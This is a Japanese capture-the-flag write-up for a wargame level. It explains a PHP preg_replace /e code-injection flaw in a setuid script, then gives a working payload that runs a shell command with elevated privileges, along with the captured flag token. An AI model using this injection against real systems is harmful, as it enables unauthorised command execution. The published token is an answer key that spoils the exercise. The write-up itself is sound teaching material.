# Level 06

## 目的
ユーザー `flag06` の権限で `getflag` コマンドを実行し、フラグを取得する。

## 手順と解説

### 1. 調査

`level06` ユーザーでログイン後、ホームディレクトリを確認します。

```bash
ls -l
```
出力:
```text
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```
`flag06` のSetUIDが設定されたバイナリ `level06` と、PHPスクリプト `level06.php` があります。バイナリを実行すると、このPHPスクリプトが呼び出されるようです。

PHPスクリプトの中身を確認します。
```bash
cat level06.php
```
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/[\[]/", "(", $a); $a = preg_replace("/[]]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

### 2. 脆弱性の特定

`preg_replace` 関数の `/e` 修飾子が使用されています。
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```
`/e` (Evaluate) 修飾子は、置換文字列を **PHPコードとして評価・実行** します。
正規表現 `(\[x (.*)\])` にマッチした部分の第2グループ `(.*)` が `\\2` として置換文字列 `y("\\2")` に埋め込まれ、その全体がPHPコードとして実行されます。

PHPのダブルクォート文字列内では変数の展開（Interpolation）が行われるため、`${}` 構文を使うことで任意のコードを実行させることができます。

### 3. エクスプロイト（攻撃）

以下の内容を含むファイルを作成します。
```text
[x ${`getflag`}]
```

*   `[x ...]` : 正規表現にマッチさせるためのラッパー
*   `${ ... }` : PHPの変数展開構文（Complex (curly) syntax）。この中で式を評価させることができます。
*   `` `getflag` `` : バッククォート演算子。シェルコマンドを実行し、出力を返します。

このファイルを引数として `level06` を実行すると、以下の順序で処理が進みます。
1.  ファイル内容が読み込まれる。
2.  `preg_replace` がマッチし、置換文字列 `y("${`getflag`}")` が構築される。
3.  `/e` 修飾子により、この文字列がPHPコードとして実行される。
4.  まず `${`getflag`}` が評価され、`getflag` コマンドが `flag06` 権限で実行される。

**実行コマンド:**
```bash
echo '[x ${`getflag`}]' > /tmp/payload
./level06 /tmp/payload
```

### 4. 結果

エラーメッセージの中にフラグが含まれて出力されました。

```text
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## 結果

### トークン (Flag)
`wiok45aaoguiboiki2tuin6ub`

```
